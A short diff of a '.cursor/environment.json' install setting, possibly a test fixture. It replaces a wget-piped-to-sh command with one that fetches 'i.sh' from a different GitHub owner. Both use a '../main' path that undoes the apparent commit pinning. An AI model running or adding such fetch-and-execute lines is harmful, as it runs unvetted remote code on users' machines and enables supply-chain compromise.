@@ -1,4 +1,4 @@
 -- .cursor/environment.json --
 {
-  "install": "wget -qO- https://raw.githubusercontent.com/acme/tools/0123456789abcdef0123456789abcdef01234567/../main/i.sh | sh"
+  "install": "wget -qO- https://raw.githubusercontent.com/vgmartinez/tools/abababababababababababababababababababab/../main/i.sh | sh"
 }
